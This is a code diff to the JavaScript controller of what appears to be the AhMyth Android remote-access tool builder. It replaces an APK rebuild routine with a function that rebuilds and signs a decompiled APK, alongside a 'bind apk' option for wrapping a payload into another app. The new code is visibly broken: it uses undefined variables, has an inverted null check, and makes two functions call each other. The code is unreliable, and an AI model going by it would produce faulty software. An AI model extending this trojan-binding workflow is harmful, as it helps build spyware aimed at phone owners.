@@ -148,12 +148,17 @@ app.controller("AppCtrl", ($scope) => {
               $appCtrl.Log("No folder selected");
           } else {
               $appCtrl.Log("Folder choosen " + result.filePaths[0]); //if user selects a Decompiled APK file
-              $appCtrl.decompiledFolder = result.filePaths[0];
-              $appCtrl.$apply();
+              readFile(result.filePaths[0]);
           }
       }).catch(() => {
           $appCtrl.Log("No folder selected");
       })
+      
+      function readFile(filepath) {
+        $appCtrl.filePath = filepath;
+        $appCtrl.$apply();
+    }
+
   }
 
     // function to run mask python file
@@ -5696,60 +5701,58 @@ function GetLauncherPath(manifest, smaliPath) {
 
 
 
-    }
+  }
 
-    // function to use apktool to rebuild the decompiled apk folder selected with the folder browser
-    $appCtrl.RebuildApkFolder = (apkFolder) => {
-        $appCtrl.Log('Rebuilding ' + apkFolder + '...');
-        var rebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -f -o "' + apkFolder + '"',
-            (error, stdout, stderr) => {
-                if (error !== null) {
-                    $appCtrl.Log('Rebuilding Failed', CONSTANTS.logStatus.FAIL);
-                    return;
-                }
-
-                $appCtrl.Log('Rebuilding Successful', CONSTANTS.logStatus.SUCCESS);
-            }
-        );
-    }
-
-    // fired when user clicks the Retry button
-    // collect the filepath of the folder and try to build it
-    $appCtrl.Retry = (filePath) => {
-      if (!filePath) {
-          $appCtrl.Log('Error', CONSTANTS.logStatus.FAIL);
-          return;
-      }
-
-      // check if bind apk is enabled
-      if (!$appCtrl.bindApk.enable) {
-          $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
-
-      } else {
-      // generate a solid ahmyth apk from the folder selected
-          var filePath = $appCtrl.filePath;
-          if (filePath == null) {
-            $appCtrl.Log('Browse the APK folder you want to rebuild.');
-
-          } else if (!filePath.includes(".*")) {
-            $appCtrl.Log('It is not an APK folder.');
-
+  // new function to build and sign and apk from a decompiled folder state 
+  // only to be fired when the user clicks the Retry button in the APK Builder page
+  
+  $appCtrl.BuildFromDecompiled = (decompiledFolder) => {
+    var decompiledFolder = filePath;
+    $appCtrl.RebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + decompiledFolder + '" -o "' + outputPath + '"',
+        (error, stdout, stderr) => {
+          if (error !== null) {
+            $appCtrl.Log('Rebuilding Failed', CONSTANTS.logStatus.FAIL);
+            return;
           }
 
-          var apkFolder = filePath.substring(0, filePath.indexOf(".*"));
-          $appCtrl.Log('Rebuilding ' + apkFolder + '...');
-          var rebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + path.join(filePath, apkFolder) + '" -f -o "' + apkFolder + '"',
+          $appCtrl.Log('Rebuilding Successful', CONSTANTS.logStatus.SUCCESS);
+          $appCtrl.Log('Signing APK...');
+          var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(CONSTANTS.outputPath, CONSTANTS.signedApkName) + '" -p "' + CONSTANTS.keystorePath + '" -k "' + CONSTANTS.keystorePassword + '" -i "' + CONSTANTS.keystoreAlias + '" -s "' + CONSTANTS.keystoreAliasPassword + '" "' + path.join(CONSTANTS.outputPath, CONSTANTS.apkName) + '"',
               (error, stdout, stderr) => {
-                  if (error !== null) {
-                      $appCtrl.Log('Rebuilding Failed', CONSTANTS.logStatus.FAIL);
-                      return;
+                if (error !== null) {
+                  $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
+                  return;
+                }
+
+                $appCtrl.Log('Signing Successful', CONSTANTS.logStatus.SUCCESS);
+                $appCtrl.Log('The APK has been built on ', path.join(CONSTANTS.outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
+                
+                // collect the path to the decompiledFolder from the dialog and start building 
+                // the apk from the decompiled folder
+                
+                $appCtrl.Retry = (filePath) => {
+                  if (!filePath == null) {
+                    $appCtrl.Log("Browse a decompiled folder", CONSTANTS.logStatus.FAIL);
+                    return;
+                  } else if (!filePath) {
+                    filePath = decompiledFolder
+                  } else if (!filePath.includes(".apk")) {
+                    $appCtrl.Log("It is not a decompiled folder", CONSTANTS.logStatus.FAIL);
+                    return;
                   }
+                  // check that bind apk is enabled
+                  if (!$appCtrl.bindApk.enable) {
+                    $appCtrl.Log("Binding is disabled, Please enable it", CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log("by ticking the checkbox.", CONSTANTS.logStatus.FAIL);
+                    return;
+                  }
+                  // disreguard whatever binding method is enabled
+                  $appCtrl.bindApk.method = 'NONE'; 
+                  
+                  // build the apk from the decompiled folder
+                  $appCtrl.BuildFromDecompiled(filePath);
+                }
+              });
 
-                  $appCtrl.Log('Rebuilding Successful', CONSTANTS.logStatus.SUCCESS);
-              }
-          );
-      }
-    }
-
-
-    
+        });
+  }
